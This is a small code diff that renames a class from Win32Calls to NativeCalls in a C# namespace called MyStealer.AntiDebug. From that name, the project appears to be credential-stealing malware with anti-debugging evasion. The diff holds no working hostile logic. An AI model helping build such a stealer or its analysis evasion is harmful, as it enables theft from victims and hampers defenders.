@@ -3,7 +3,7 @@ using System;
 
 namespace MyStealer.AntiDebug
 {
-    internal partial class Win32Calls
+    internal partial class NativeCalls
     {
         [StructLayout(LayoutKind.Sequential)]
         public struct CONTEXT
